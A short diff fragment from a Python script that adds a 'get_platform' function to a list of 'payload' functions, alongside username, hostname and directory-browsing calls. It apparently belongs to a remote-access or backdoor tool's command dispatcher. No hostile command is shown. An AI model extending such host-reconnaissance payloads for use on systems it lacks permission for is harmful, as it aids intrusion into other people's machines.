@@ -92,6 +92,7 @@ if __name__ == '__main__':
 
     funcs = [payload.get_username,
             payload.get_hostname,
+            payload.get_platform,
             payload.list_dir,
             payload.change_dir,
             payload.get_current_dir,
